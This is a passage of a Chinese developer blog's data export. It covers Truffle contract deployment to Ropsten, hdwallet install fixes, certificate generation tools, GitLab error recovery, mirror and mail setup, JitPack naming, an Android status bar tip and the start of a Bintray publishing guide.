(/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request-event-target.js:27:61) at e.dispatchEvent [as _setReadyState] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request.js:208:1) at e._setReadyState [as _onHttpRequestError] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request.js:349:1) at ClientRequest._onHttpRequestError (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/xhr2-cookies/dist/xml-http-request.js:252:47) at ClientRequest.emit (events.js:198:13) at TLSSocket.socketErrorListener (_http_client.js:392:9) at TLSSocket.emit (events.js:198:13) at emitErrorNT (internal/streams/destroy.js:91:8) at emitErrorAndCloseNT (internal/streams/destroy.js:59:3) at process._tickCallback (internal/process/next_tick.js:63:19) Deploying 'Migrations' ---------------------- &gt; block number: 5878867 &gt; block timestamp: 1561706914 &gt; account: 0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65 &gt; balance: 1.99475076 &gt; gas used: 262462 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00524924 ETH ------------------------------------- &gt; Total cost: 0.00524924 ETH2_deploy_contracts.js===================== Deploying 'VToken' ------------------ &gt; block number: 5878869 &gt; block timestamp: 1561706947 &gt; account: 0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65 &gt; balance: 1.96577714 &gt; gas used: 1421673 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.02843346 ETH ------------------------------------- &gt; Total cost: 0.02843346 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.0336827 ETHStarting migrations...======================&gt; Network name: 'ropsten'&gt; Network id: 3&gt; Block gas limit: 0x7a12001_initial_migration.js====================== Deploying 'Migrations' ---------------------- &gt; transaction hash: 0xcb0b58dc9e78627a5c703c605372d95a21a38d477223a34cb50674e67a035f95 &gt; Blocks: 1 Seconds: 12 &gt; contract address: 0x43A01b6F8f49906f29F12af26572c341b9720719 &gt; block number: 5878879 &gt; block timestamp: 1561706995 &gt; account: 0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65 &gt; balance: 1.99445076 &gt; gas used: 277462 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00554924 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00554924 ETH2_deploy_contracts.js===================== Deploying 'VToken' ------------------ &gt; transaction hash: 0x877fd23aeec91a37c076bee389e13563ffa67398a6c264ae9760033f897d080f &gt; Blocks: 1 Seconds: 22 &gt; contract address: 0xe834bB279e791f3Bb6b9c20C04Ee7cdEb4b79308 &gt; block number: 5878886 &gt; block timestamp: 1561707091 &gt; account: 0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65 &gt; balance: 1.96337714 &gt; gas used: 1511673 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.03023346 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.03023346 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.0357827 ETHsamwen@samwen-ubuntu:~/VToken$ 查看部署成果先看下账号下发生了什么交易，通过 https://ropsten.etherscan.io/address/账号地址 来访问 。这是本次部署： 0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65 一共有四笔交易，两份合约，就是我们执行的。 合约地址： 0xe834bB279e791f3Bb6b9c20C04Ee7cdEb4b79308 通过网页可以看到还需要我们上传源代码，此处由于依赖到 OpenZeppelin ，结果上传几次都编译失败（Remix编译没问题），先不管了。 常见错误问题 部署的账号没有ETH余额 12345678910111213141516171819202122232425262728293031323334samwen@samwen-ubuntu:~/VToken$ truffle deploy --reset --network ropstenCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name: 'ropsten'&gt; Network id: 3&gt; Block gas limit: 0x7a12001_initial_migration.js====================== Deploying 'Migrations' ----------------------Error: Error: Error: *** Deployment Failed ***\"Migrations\" could not deploy due to insufficient funds * Account: 0xA495032Bf8c02cC4594a40F53AC5A38555728107 * Balance: 0 wei * Message: insufficient funds for gas * price + value * Message: sender doesn't have enough funds to send tx. The upfront cost is: 134439500000000000 and the sender's account only has: 0 * Try: + Using an adequately funded account + If you are using a local Geth node, verify that your node is synced. at Object.run (/usr/local/lib/node_modules/truffle/build/webpack:/packages/truffle-migrate/index.js:92:1) at process._tickCallback (internal/process/next_tick.js:68:7)Truffle v5.0.24 (core: 5.0.24)Node v10.16.0 could not deploy due to insufficient funds : 因资金不足无法部署 gas设置太高 123456789101112131415161718192021222324252627282930===========================&gt; Everything is up to date, there is nothing to compile.Migrations dry-run (simulation)===============================&gt; Network name: 'ropsten-fork'&gt; Network id: 3&gt; Block gas limit: 0x7a12001_initial_migration.js====================== Deploying 'Migrations' ----------------------Error: Error: Error: *** Deployment Failed ***\"Migrations\" exceeded the block limit (with a gas value you set). * Block limit: 0x203c3f0 * Gas sent: 11118500000 * Try: + Sending less gas. + Setting a higher network block limit if you are on a private network or test client (like ganache). at Object.run (/usr/local/lib/node_modules/truffle/build/webpack:/packages/truffle-migrate/index.js:92:1) at process._tickCallback (internal/process/next_tick.js:68:7)Truffle v5.0.24 (core: 5.0.24)Node v10.16.0 超过block限制(使用您设置的 gas 值)，把gas的值改小。 hdwallet安装问题最新解决办法20200114记录(Ubuntu)最新解决办法20200114记录(Ubuntu)最新解决办法20200114记录(Ubuntu) 这是npm一个普遍的权限问题，尽量不要以root账号身份安装此依赖（普通账号也不要加sudo） 如果一定要用root身份，在命令后加参数 --allow-root 最好是普通账号执行 npm install truffle-hdwallet-provider --unsafe-perm=true root账号执行 npm install truffle-hdwallet-provider --unsafe-perm=true --allow-root 早期手动修改的办法，已不建议使用在Windows10系统中安装hdwallet一样会提示缺少C++组件：MSBUILD : error MSB3428: 未能加载 Visual C++ 组件“VCBuild.exe”。要解决此问题，1) 安装 .NET Framework 2.0 SDK；一般通过管理员启动一个终端，执行$ npm install -g windows-build-tools 会安装好C++依赖，但是我的Windows10安装不了这个软件，手动下载MSBuild.exe也是无法安装，打开就闪退。 所以，这里只记录一下在Ubuntu下的解决日志。 如果想尽快使用，可以下载我在Ubuntu下打包的 node_modules： https://share.weiyun.com/5fscwl8 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188# 先确认已安装C++编译环境samwen@samwen-ubuntu:~/VToken$ sudo apt-get install build-essentialReading package lists... DoneBuilding dependency tree Reading state information... Donebuild-essential is already the newest version (12.4ubuntu1).0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.samwen@samwen-ubuntu:~/VToken$samwen@samwen-ubuntu:~/VToken$ sudo npm install truffle-hdwallet-providernpm WARN deprecated tar.gz@1.0.7: ⚠️ WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar&gt; scrypt@6.0.3 preinstall /home/samwen/VToken/node_modules/scrypt&gt; node node-scrypt-preinstall.js&gt; scrypt@6.0.3 install /home/samwen/VToken/node_modules/scrypt&gt; node-gyp rebuildgyp ERR! configure error gyp ERR! stack Error: EACCES: permission denied, mkdir '/home/samwen/VToken/node_modules/scrypt/build'gyp ERR! System Linux 4.15.0-20-genericgyp ERR! command \"/usr/local/bin/node\" \"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js\" \"rebuild\"gyp ERR! cwd /home/samwen/VToken/node_modules/scryptgyp ERR! node -v v10.16.0gyp ERR! node-gyp -v v3.8.0gyp ERR! not ok npm WARN VToken@1.0.0 No repository field.npm WARN VToken@1.0.0 No license field.npm ERR! code ELIFECYCLEnpm ERR! errno 1npm ERR! scrypt@6.0.3 install: `node-gyp rebuild`npm ERR! Exit status 1npm ERR! npm ERR! Failed at the scrypt@6.0.3 install script.npm ERR! This is probably not a problem with npm. There is likely additional logging output above.npm ERR! A complete log of this run can be found in:npm ERR! /home/samwen/.npm/_logs/2019-06-28T05_50_58_642Z-debug.log# 错误提示没有权限创建目录，手动创建目录samwen@samwen-ubuntu:~/VToken$ sudo mkdir -p /home/samwen/VToken/node_modules/scrypt/buildsamwen@samwen-ubuntu:~/VToken$ sudo chmod -R 777 /home/samwen/VToken/node_modules/scrypt/# 重新运行安装一次samwen@samwen-ubuntu:~/VToken$ sudo npm install truffle-hdwallet-providernpm WARN deprecated fs-promise@2.0.3: Use mz or fs-extra^3.0 with Promise Supportnpm WARN deprecated tar.gz@1.0.7: ⚠️ WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tarnpm ERR! path /home/samwen/VToken/node_modules/web3-providers-ws/node_modules/websocketnpm ERR! code EISGITnpm ERR! git /home/samwen/VToken/node_modules/web3-providers-ws/node_modules/websocket: Appears to be a git repo or submodule.npm ERR! git /home/samwen/VToken/node_modules/web3-providers-ws/node_modules/websocketnpm ERR! git Refusing to remove it. Update manually,npm ERR! git or move it out of the way first.npm ERR! A complete log of this run can be found in:npm ERR! /home/samwen/.npm/_logs/2019-06-28T05_58_55_864Z-debug.logsamwen@samwen-ubuntu:~/VToken$ # 提示websocket下有 'git repo or submodule'，手动删除 '.git'samwen@samwen-ubuntu:~/VToken$ sudo rm -rf node_modules/web3-providers-ws/node_modules/websocket/.gitsamwen@samwen-ubuntu:~/VToken$ sudo npm install truffle-hdwallet-providernpm WARN deprecated fs-promise@2.0.3: Use mz or fs-extra^3.0 with Promise Supportnpm WARN deprecated tar.gz@1.0.7: ⚠️ WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar&gt; scrypt@6.0.3 preinstall /home/samwen/VToken/node_modules/scrypt&gt; node node-scrypt-preinstall.js&gt; scrypt@6.0.3 install /home/samwen/VToken/node_modules/scrypt&gt; node-gyp rebuildgyp ERR! configure error gyp ERR! stack Error: EACCES: permission denied, mkdir '/home/samwen/VToken/node_modules/scrypt/build'gyp ERR! System Linux 4.15.0-20-genericgyp ERR! command \"/usr/local/bin/node\" \"/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js\" \"rebuild\"gyp ERR! cwd /home/samwen/VToken/node_modules/scryptgyp ERR! node -v v10.16.0gyp ERR! node-gyp -v v3.8.0gyp ERR! not ok npm WARN VToken@1.0.0 No repository field.npm WARN VToken@1.0.0 No license field.npm ERR! code ELIFECYCLEnpm ERR! errno 1npm ERR! scrypt@6.0.3 install: `node-gyp rebuild`npm ERR! Exit status 1npm ERR! npm ERR! Failed at the scrypt@6.0.3 install script.npm ERR! This is probably not a problem with npm. There is likely additional logging output above.npm ERR! A complete log of this run can be found in:npm ERR! /home/samwen/.npm/_logs/2019-06-28T06_10_26_806Z-debug.logsamwen@samwen-ubuntu:~/VToken$samwen@samwen-ubuntu:~/VToken$ node-gyp rebuildinternal/modules/cjs/loader.js:638 throw err; ^Error: Cannot find module 'graceful-fs' at Function.Module._resolveFilename (internal/modules/cjs/loader.js:636:15) at Function.Module._load (internal/modules/cjs/loader.js:562:25) at Module.require (internal/modules/cjs/loader.js:690:17) at require (internal/modules/cjs/helpers.js:25:18) at Object.&lt;anonymous&gt; (/usr/share/node-gyp/lib/node-gyp.js:12:10) at Module._compile (internal/modules/cjs/loader.js:776:30) at Object.Module._extensions..js (internal/modules/cjs/loader.js:787:10) at Module.load (internal/modules/cjs/loader.js:653:32) at tryModuleLoad (internal/modules/cjs/loader.js:593:12) at Function.Module._load (internal/modules/cjs/loader.js:585:3)samwen@samwen-ubuntu:~/VToken$# 切换到root账号执行，就没有权限问题了。samwen@samwen-ubuntu:~/VToken$ sudo su rootroot@samwen-ubuntu:/home/samwen/VToken# sudo npm install truffle-hdwallet-providernpm WARN deprecated fs-promise@2.0.3: Use mz or fs-extra^3.0 with Promise Supportnpm WARN deprecated tar.gz@1.0.7: ⚠️ WARNING ⚠️ tar.gz module has been deprecated and your application is vulnerable. Please use tar module instead: https://npmjs.com/tar&gt; scrypt@6.0.3 preinstall /home/samwen/VToken/node_modules/scrypt&gt; node node-scrypt-preinstall.js&gt; scrypt@6.0.3 install /home/samwen/VToken/node_modules/scrypt&gt; node-gyp rebuildmake: Entering directory '/home/samwen/VToken/node_modules/scrypt/build' SOLINK_MODULE(target) Release/obj.target/copied_files.node COPY Release/copied_files.node CC(target) Release/obj.target/scrypt_wrapper/src/util/memlimit.o CC(target) Release/obj.target/scrypt_wrapper/src/scryptwrapper/keyderivation.o CC(target) Release/obj.target/scrypt_wrapper/src/scryptwrapper/pickparams.o CC(target) Release/obj.target/scrypt_wrapper/src/scryptwrapper/hash.o AR(target) Release/obj.target/scrypt_wrapper.a COPY Release/scrypt_wrapper.a CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/lib/crypto/crypto_scrypt.o CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/lib/crypto/crypto_scrypt_smix.o CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/libcperciva/util/warnp.o CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/libcperciva/alg/sha256.o CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/libcperciva/util/insecure_memzero.o CC(target) Release/obj.target/scrypt_lib/scrypt/scrypt-1.2.0/lib/scryptenc/scryptenc_cpuperf.o AR(target) Release/obj.target/scrypt_lib.a COPY Release/scrypt_lib.a CXX(target) Release/obj.target/scrypt/src/node-boilerplate/scrypt_common.o CXX(target) Release/obj.target/scrypt/src/node-boilerplate/scrypt_params_async.oIn file included from ../src/node-boilerplate/inc/scrypt_async.h:28:0, from ../src/node-boilerplate/inc/scrypt_params_async.h:28, from ../src/node-boilerplate/scrypt_params_async.cc:4:../src/node-boilerplate/inc/scrypt_common.h: In constructor ‘NodeScrypt::Params::Params(const v8::Local&lt;v8::Object&gt;&amp;)’:../src/node-boilerplate/inc/scrypt_common.h:39:63: warning: ‘uint32_t v8::Value::Uint32Value() const’ is deprecated: Use maybe version [-Wdeprecated-declarations] N(obj-&gt;Get(Nan::New(\"N\").ToLocalChecked())-&gt;Uint32Value()), ^In file included from /root/.node-gyp/10.16.0/include/node/v8.h:26:0, from /root/.node-gyp/10.16.0/include/node/node.h:63, from ../../nan/nan.h:53, from ../src/node-boilerplate/scrypt_params_async.cc:1:/root/.node-gyp/10.16.0/include/node/v8.h:2477:47: note: declared here V8_DEPRECATED(\"Use maybe version\", uint32_t Uint32Value() const); ^/root/.node-gyp/10.16.0/include/node/v8config.h:324:3: note: in definition of macro ‘V8_DEPRECATED’ declarator __attribute__((deprecated(message))) ^~~~~~~~~~很多node-gyp日志很多node-gyp日志很多node-gyp日志 CXX(target) Release/obj.target/scrypt/scrypt_node.o SOLINK_MODULE(target) Release/obj.target/scrypt.node COPY Release/scrypt.nodemake: Leaving directory '/home/samwen/VToken/node_modules/scrypt/build'npm WARN VToken@1.0.0 No repository field.npm WARN VToken@1.0.0 No license field.+ truffle-hdwallet-provider@1.0.11added 8 packages from 8 contributors and audited 112619 packages in 60.524sfound 0 vulnerabilitiesroot@samwen-ubuntu:/home/samwen/VToken# # 终于没报错了root@samwen-ubuntu:/home/samwen/VToken# exitexitsamwen@samwen-ubuntu:~/VToken$ cat package.json &#123; \"name\": \"VToken\", \"version\": \"1.0.0\", \"dependencies\": &#123; \"truffle-hdwallet-provider\": \"^1.0.11\", \"zeppelin-solidity\": \"^1.12.0\" &#125;&#125;# truffle-hdwallet-provider 已安装成功","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"8.1、基于truffle unbox初始化项目","slug":"区块链/8.1、基于truffle unbox初始化项目","date":"2018-08-08T15:53:36.000Z","updated":"2019-06-19T13:52:36.000Z","comments":true,"path":"区块链/8.1、基于truffle unbox初始化项目/","link":"","permalink":"http://yoursite.com/区块链/8.1、基于truffle unbox初始化项目/","excerpt":"","text":"在前面我们知道可以通过 truffle init 来初始化项目，但是这个只是一个智能合约相关的项目，如果我们要开发Dapp Web 应用，还得做一些配置之类的工作，所以truffle带了unbox功能，直接初始化一个集成各种配置环境的项目，如react、vue等。 在空目录下通过命令 truffle unbox [name of box] 就能生成一个开箱即用的项目。 [name of box] 的都在 github或者truffleframework 可以找到。 比如： 1234567891011121314# MetaCoin 智能合约实例$ truffle unbox metacoin-box # 包含所有 OpenZeppelin 的教程ls$ truffle unbox tutorialtoken-box# 宠物商店DApp的完整项目代码$ truffle unbox pet-shop# 使用Webpack的前端项目，包含合约、迁移、测试、用户界面和webpack构建流水线$ truffle unbox webpack# 使用vue框架进行dapp开发$ truffle unbox DOkwufulueze/eth-vue 可以看到 unbox 其实是下载 github 仓库的zip包，我们也可以直接 clone github 上的仓库代码到本地。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"简易HTTPS 加密证书的工具","slug":"Web后端/简易HTTPS 加密证书的工具","date":"2018-07-12T01:52:36.000Z","updated":"2021-12-28T03:24:10.218Z","comments":true,"path":"Web后端/简易HTTPS 加密证书的工具/","link":"","permalink":"http://yoursite.com/Web后端/简易HTTPS 加密证书的工具/","excerpt":"","text":"1. keytoolJDK中keytool是一个证书管理工具，可以生成“自签名证书”，多用于Java应用，如：Tomcat。12345678$ keytool -genkey -alias tomcat -storetype PKCS12 -keyalg RSA -keysize 2048 -keystore keystore.p12 -validity 3650****** (输入详细信息)***$ lskeystore.p12 (生成p12格式证书) 2. openssl 数字证书管理工具openssl和keytool的区别： keytool没办法签发证书，而openssl能够进行签发和证书链的管理。 openssl也可以生成“自签名证书”，但不止于此，它还能够进行“签发”和“管理证书链”(双向认证)。123456789101112131415161718192021222324# 生成私钥文件$ openssl genrsa -des3 -out server.key 2048 (输入安全密码)# 生成CSR（证书签名请求）$ openssl req -new -key server.key -out server.csr Country Name (2 letter code) [AU]:CNState or Province Name (full name) [Some-State]:ShenzhunLocality Name (eg, city) []:ShenzhunOrganization Name (eg, company) [Internet Widgits Pty Ltd]:ApGo (公司名称)Organizational Unit Name (eg, section) []:technologyCommon Name (e.g. server FQDN or YOUR name) []:localhost （Common Name应该与域名保持一致，否则会引起浏览器警告）Email Address []:admin@localhostPlease enter the following 'extra' attributesto be sent with your certificate requestA challenge password []:(可不填)An optional company name []:(可不填)# 生成自签名证书$ openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt$ lsserver.crt server.csr server.key (生成crt格式证书) 3. mkcertmkcert 是生成本地 HTTPS 加密证书的工具，一个命令就可以生成证书，不需要任何配置。 在 Linux 上，安装 certutil123$ sudo apt install libnss3-tools$ sudo yum install nss-tools 使用示例 1234567891011121314151617$ mkcert -installCreated a new local CA at &quot;/Users/filippo/Library/Application Support/mkcert&quot; 💥The local CA is now installed in the system trust store! ⚡️The local CA is now installed in the Firefox trust store (requires restart)! 🦊$ mkcert example.com &apos;*.example.org&apos; myapp.dev localhost 127.0.0.1 ::1Using the local CA at &quot;/Users/filippo/Library/Application Support/mkcert&quot; ✨Created a new certificate valid for the following names 📜 - &quot;example.com&quot; - &quot;*.example.org&quot; - &quot;myapp.dev&quot; - &quot;localhost&quot; - &quot;127.0.0.1&quot; - &quot;::1&quot;The certificate is at &quot;./example.com+5.pem&quot; and the key at &quot;./example.com+5-key.pem&quot; ✅ 使用方法参考","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"ssl,https","slug":"ssl-https","permalink":"http://yoursite.com/tags/ssl-https/"}]},{"title":"gitlab错误修复","slug":"git/gitlab502错误修复","date":"2018-06-26T11:52:36.000Z","updated":"2022-01-18T06:44:24.601Z","comments":true,"path":"git/gitlab502错误修复/","link":"","permalink":"http://yoursite.com/git/gitlab502错误修复/","excerpt":"","text":"502错误修复服务器断电关机，再开机时一般会导致 gitlab 502错误 123456789101112131415161718192021222324252627282930313233343536$ gitlab-ctl statusrun: gitaly: (pid 1072) 689s; run: log: (pid 1071) 689srun: gitlab-monitor: (pid 1101) 689s; run: log: (pid 1090) 689srun: gitlab-workhorse: (pid 1092) 689s; run: log: (pid 1078) 689srun: logrotate: (pid 1115) 689s; run: log: (pid 1097) 689srun: nginx: (pid 1091) 689s; run: log: (pid 1077) 689srun: node-exporter: (pid 1111) 689s; run: log: (pid 1096) 689srun: postgres-exporter: (pid 1113) 689s; run: log: (pid 1098) 689srun: postgresql: (pid 1114) 689s; run: log: (pid 1095) 689srun: prometheus: (pid 14267) 0s; run: log: (pid 1089) 689srun: redis: (pid 1110) 689s; run: log: (pid 1094) 689srun: redis-exporter: (pid 1075) 689s; run: log: (pid 1074) 689srun: sidekiq: (pid 1076) 689s; run: log: (pid 1073) 689srun: unicorn: (pid 14244) 1s; run: log: (pid 1079) 689s# 尝试重启$ gitlab-ctl restartok: run: gitaly: (pid 14454) 0sok: run: gitlab-monitor: (pid 14465) 1sok: run: gitlab-workhorse: (pid 14469) 0sok: run: logrotate: (pid 14482) 1sok: run: nginx: (pid 14508) 0sok: run: node-exporter: (pid 14514) 0sok: run: postgres-exporter: (pid 14519) 1sok: run: postgresql: (pid 14532) 0sok: run: prometheus: (pid 14544) 0sok: run: redis: (pid 14549) 0sok: run: redis-exporter: (pid 14558) 0sok: run: sidekiq: (pid 14575) 0sok: run: unicorn: (pid 14587) 0s# 按照官网的建议# 如果所有服务都正常（没有down掉）还是502错误的话，重启sidekiq$ gitlab-ctl restart sidekiq# 或者$ gitlab-ctl hup unicorn 500错误修复记录一次500错误，是由于强制关掉宿主机导致的，用502错误的修复方法无效果。1234567891011121314151617181920212223242526272829303132333435# 通过status知道prometheus和redis两个服务不能正常启动$ gitlab-ctl status***down: prometheudown: redis***# 查看实时日志，发现prometheu(leveldb数据库存在问题要修复)和redis(dump.rdb存在问题要修复)在打印错误日志$ gitlab-ctl tail# 网上有修复leveldb的方法，但是太麻烦，python的版本太旧，修复leveldb存在困难# 考虑到prometheu(监控告警时序数据，项目中没用到)和redis(缓存数据，丢了可以重新生成)的数据不重要，所以决定把损坏的数据库文件做删除处理。# 1. 停止所有服务$ gitlab-ctl stop# 2. 移除prometheu的leveldb数据库$ cd /var/opt/gitlab/prometheus$ lsdata prometheus.yml$ mv data data_old# 3. 移除redis持久化数据库$ cd /var/opt/gitlab/redis$ lsdump.rdb redis.conf redis.socket temp-56637.rdb$ mv dump.rdb mump.rdb.bak$ mv temp-56637.rdb temp-56637.rdb.bak$ ls$ mump.rdb.bak redis.conf redis.socket temp-56637.rdb.bak# 4. 重新启动服务$ gitlab-ctl start$ gitlab-ctl restart sidekiq$ gitlab-ctl hup unicorn# 5. 浏览器打开Gitlab正常，仓库数据没有丢失。","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"Gitlab-Ubuntu清华大学安装源","slug":"git/gitlab-ubuntu清华大学安装源","date":"2018-06-26T11:52:36.000Z","updated":"2022-01-18T08:49:41.670Z","comments":true,"path":"git/gitlab-ubuntu清华大学安装源/","link":"","permalink":"http://yoursite.com/git/gitlab-ubuntu清华大学安装源/","excerpt":"","text":"【Gitlab Community Edition 镜像使用帮助】 注意: gitlab-ce 镜像仅支持 x86-64 架构 Debian/Ubuntu 用户首先信任 GitLab 的 GPG 公钥: 1curl https://packages.gitlab.com/gpg.key 2&gt; /dev/null | sudo apt-key add - &amp;&gt;/dev/null 再选择你的 Debian/Ubuntu 版本，文本框中内容写进 /etc/apt/sources.list.d/gitlab-ce.list 你的Debian/Ubuntu版本: Debian 8 (Jessie) Debian 9 (Stretch) Debian 10 (Buster) Ubuntu 14.04 LTS Ubuntu 16.04 LTS Ubuntu 18.04 LTS 如：1deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu trusty main 安装 gitlab-ce: 12sudo apt-get updatesudo apt-get install gitlab-ce RHEL/CentOS 用户新建 /etc/yum.repos.d/gitlab-ce.repo，内容为 12345[gitlab-ce]name=Gitlab CE Repositorybaseurl=https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el$releasever/gpgcheck=0enabled=1 再执行 12sudo yum makecachesudo yum install gitlab-ce","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"gitlab邮箱配置","slug":"git/gitlab邮箱配置","date":"2018-06-26T11:52:36.000Z","updated":"2021-12-28T03:24:10.238Z","comments":true,"path":"git/gitlab邮箱配置/","link":"","permalink":"http://yoursite.com/git/gitlab邮箱配置/","excerpt":"","text":"配置指南 ，这是有官方给的各种邮箱的配置示例。 阿里云企业邮箱123456789gitlab_rails['smtp_enable'] = truegitlab_rails['smtp_address'] = \"smtp.qiye.aliyun.com\"gitlab_rails['smtp_port'] = 465gitlab_rails['smtp_user_name'] = \"username@your domain\"gitlab_rails['smtp_password'] = \"password\"gitlab_rails['smtp_domain'] = \"your domain\"gitlab_rails['smtp_authentication'] = \"login\"gitlab_rails['smtp_enable_starttls_auto'] = falsegitlab_rails['smtp_tls'] = true 默认使用ssl，如果不用就要加入以下配置12345gitlab_rails['smtp_enable_starttls_auto'] = falsegitlab_rails['smtp_tls'] = falsegitlab_rails['smtp_openssl_verify_mode'] = 'none'gitlab_rails['smtp_ssl'] = false gitlab_rails['smtp_force_ssl'] = false 测试邮件功能12$ gitlab-rails consoleNotify.test_email(&apos;test@qq.com&apos;, &apos;Message Subject&apos;, &apos;Message Body&apos;).deliver_now","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"gitpack仓库命名","slug":"git/jitpack仓库命名","date":"2018-06-26T11:52:36.000Z","updated":"2021-12-28T03:24:10.239Z","comments":true,"path":"git/jitpack仓库命名/","link":"","permalink":"http://yoursite.com/git/jitpack仓库命名/","excerpt":"","text":"要把库放在Jitpack使用，一般引用是这样子： 12345678910allprojects &#123; repositories &#123; ... maven &#123; url &apos;https://jitpack.io&apos; &#125; &#125;&#125;dependencies &#123; implementation &apos;com.github.username:libraryname:version&apos;&#125; 所以最好这样： 仓库名称：小写，如：myview，如果名称太长，用中线分割，如：core-ktx 包名：和域名一样com.github.username，如：com.github.kevinvane最后jitpack生成依赖引用是：1implementation &apos;com.github.kevinvane:myview:version&apos; 这样别人引用你的库，就知道是在com.github.kevinvane包下，名称为myview。","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[{"name":"jitpack","slug":"jitpack","permalink":"http://yoursite.com/tags/jitpack/"}]},{"title":"Android6.0状态栏白底黑字","slug":"Android/Android6.0状态栏白底黑字","date":"2018-06-18T01:52:36.000Z","updated":"2018-06-18T01:52:36.000Z","comments":true,"path":"Android/Android6.0状态栏白底黑字/","link":"","permalink":"http://yoursite.com/Android/Android6.0状态栏白底黑字/","excerpt":"","text":"Android6.0以上才支持修改状态栏字体颜色(亮色) 1234567if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123; this.getWindow().getDecorView().setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN| View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR );//亮色 getWindow().setStatusBarColor(Color.WHITE);//设置状态栏背景色为白色&#125; 如果要适配4.4以上的，推荐用ImmersionBar","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/tags/Android/"}]},{"title":"android-library-jcenter","slug":"Android/android-library-jcenter","date":"2018-06-18T01:52:36.000Z","updated":"2018-06-18T01:52:36.000Z","comments":true,"path":"Android/android-library-jcenter/","link":"","permalink":"http://yoursite.com/Android/android-library-jcenter/","excerpt":"","text":"参考: AndroidStuio快速发布开源项目到Jcenter/Bintray 创建并发布一个 Android 库 Android Library上传到GitHub并一键发布到Bintray或JCenter 本文只记录操作步骤 本文只记录操作步骤 本文只记录操作步骤 apikey登录 bintray 拿到apikey，不需要创建仓库，默认已有maven/nuget等7个仓库，我们用maven就可以，当然也可以创建一个属于自己的maven仓库。 创建库项目以下是我的项目目录结构，app是示例Android app，pageablelibrary就是我们要发布的module。12345678910111213141516171819.├── app├── build.gradle├── gradle│ └── wrapper│ ├── gradle-wrapper.jar│ └── gradle-wrapper.properties├── gradle.properties├── gradlew├── gradlew.bat├── local.properties├── pageablelibrary│ ├── build.gradle│ ├── libs│ ├── pageablelibrary.iml│ └── proguard-rules.pro├── PageableLibrary.iml├── README.md└── settings.gradle 安装插件./build.gradle1234567dependencies &#123; classpath &apos;com.android.tools.build:gradle:3.1.3&apos; //新增 classpath &apos;com.github.dcendents:android-maven-gradle-plugin:1.5&apos; classpath &apos;com.jfrog.bintray.gradle:gradle-bintray-plugin:1.7.2&apos; &#125; ./pageablelibrary/build.gradle1234apply plugin: &apos;com.android.library&apos;//新增apply plugin: &apos;com.github.dcendents.android-maven&apos;apply plugin: &apos;com.jfrog.bintray&apos; 配置发布信息./pageablelibrary/build.gradle 